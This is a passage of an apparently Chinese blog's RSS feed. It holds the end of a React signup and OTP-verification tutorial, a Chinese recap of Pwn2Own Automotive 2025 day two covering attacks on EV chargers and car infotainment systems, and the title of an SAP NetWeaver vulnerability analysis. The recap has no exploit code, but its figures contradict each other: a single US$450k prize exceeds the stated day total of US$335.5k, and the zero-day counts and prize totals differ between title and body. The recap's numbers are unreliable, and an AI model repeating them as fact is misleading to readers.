&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;setFormData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;prev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;prev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;submitHandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;preventDefault&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;setLoading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;API_URL&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;/users/signup`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;formData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;withCredentials&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;dispatch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setAuthUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;dispatch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setPendingEmail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;formData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 保存电子邮件用于OTP
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;nx&#34;&gt;navigate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/verifyAcct&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 导航到OTP验证页面
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;message&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;注册失败&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;finally&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;setLoading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 访问前端Github仓库查看OTP验证的剩余代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//github.com/Derekvibe/Telehealth_Frontend/blob/main/src/pages/Auth/Join/NewUser.jsx
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/div&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;default&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;NewUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的代码呈现一个注册表单，包含用户名、电子邮件、密码和passwordConfirm字段。当用户提交表单时，前端使用Axios向后端的/users/signup端点发送POST请求。&lt;code&gt;withCredentials: true&lt;/code&gt;选项确保像认证令牌这样的cookie由后端正确设置。&lt;/p&gt;
&lt;p&gt;如果注册成功，用户数据使用setAuthUser()分派到Redux，并使用setPendingEmail()保存他们的电子邮件，以便在OTP验证期间使用。然后，用户被重定向到/verifyAcct路由，在那里他们可以输入他们的OTP。&lt;/p&gt;
&lt;h3 id=&#34;otp验证页面&#34;&gt;OTP验证页面
&lt;/h3&gt;&lt;p&gt;OTP验证页面是用户认证流程中的下一步。一旦用户注册，他们将被重定向以输入发送到其电子邮件的4位OTP。这在他们允许登录访问之前验证他们的账户。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;React&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useRef&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useEffect&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;react&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useSelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useDispatch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;react-redux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useNavigate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Link&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;react-router-dom&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;axios&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;axios&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;clearPendingEmail&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;../../../../store/authSlice&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;API_URL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;VITE_API_URL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://localhost:5000/api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 根据需要调整
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;VerifyAcct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setCode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;loading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setLoading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;resendLoading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setResendLoading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;timer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;setTimer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;inputsRef&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useRef&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dispatch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>Pwn2Own Automotive 2025 第二天战报：38.5万美元奖金与16个零日漏洞</title>
        <link>http://localhost:1313/p/pwn2own-automotive-2025-%E7%AC%AC%E4%BA%8C%E5%A4%A9%E6%88%98%E6%8A%A538.5%E4%B8%87%E7%BE%8E%E5%85%83%E5%A5%96%E9%87%91%E4%B8%8E16%E4%B8%AA%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Mon, 04 Aug 2025 19:39:17 +0800</pubDate>
        
        <guid>http://localhost:1313/p/pwn2own-automotive-2025-%E7%AC%AC%E4%BA%8C%E5%A4%A9%E6%88%98%E6%8A%A538.5%E4%B8%87%E7%BE%8E%E5%85%83%E5%A5%96%E9%87%91%E4%B8%8E16%E4%B8%AA%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;pwn2own-automotive-2025---第二天结果&#34;&gt;Pwn2Own Automotive 2025 - 第二天结果
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;2025年1月22日&lt;/strong&gt; | Dustin Childs&lt;/p&gt;
&lt;p&gt;欢迎来到Pwn2Own Automotive 2025的第二天。昨日我们为16个独特零日漏洞颁发了超过38万美元奖金，今天赛事更为激烈，WOLFBOX和特斯拉充电器首次亮相Pwn2Own。以下是第二天完整战报：&lt;/p&gt;
&lt;h2 id=&#34;成功案例&#34;&gt;成功案例
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Summoning团队&lt;/strong&gt;的Sina Kheirkhah通过组合多个漏洞攻破WOLFBOX充电器，获得5万美元奖金（CWE-839数值范围检查缺失漏洞）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PHP Hooligans团队&lt;/strong&gt;利用命令注入漏洞控制特斯拉壁挂充电器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Viettel网络安全团队&lt;/strong&gt;结合已知漏洞与命令注入攻破ChargePoint HomeFlex（奖金18,750美元）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HT3 Labs&lt;/strong&gt;通过认证缺失+OS命令注入链式攻击Phoenix Contact CHARX充电器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Synacktiv团队&lt;/strong&gt;创新性地通过充电接口逻辑漏洞攻破特斯拉系统，斩获最高单笔45万美元奖金&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术亮点&#34;&gt;技术亮点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;多团队演示了&lt;strong&gt;零点击攻击链&lt;/strong&gt;（如PCAutomotive对索尼车机的堆溢出+认证绕过组合攻击）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Autel MaxiCharger&lt;/strong&gt;被揭露存在访问控制缺陷和基于栈的缓冲区溢出&lt;/li&gt;
&lt;li&gt;阿尔派车机系统重现&lt;strong&gt;CVE-2024-23924历史漏洞&lt;/strong&gt;的&amp;quot;共享风险&amp;quot;问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;统计数据&#34;&gt;统计数据
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;当日总奖金：33.55万美元&lt;/li&gt;
&lt;li&gt;累计披露23个零日漏洞&lt;/li&gt;
&lt;li&gt;参赛团队使用了包括：
&lt;ul&gt;
&lt;li&gt;命令注入（5例）&lt;/li&gt;
&lt;li&gt;堆/栈溢出（3例）&lt;/li&gt;
&lt;li&gt;证书验证缺陷（2例）&lt;/li&gt;
&lt;li&gt;逻辑漏洞（1例）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;第三天赛事将继续聚焦电动汽车基础设施安全，包括首次亮相的EMPORIA充电器测试。&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SAP NetWeaver S/4HANA漏洞分析：通过内部函数WRITE_AND_CALL_DBPROG实现ABAP代码执行</title>
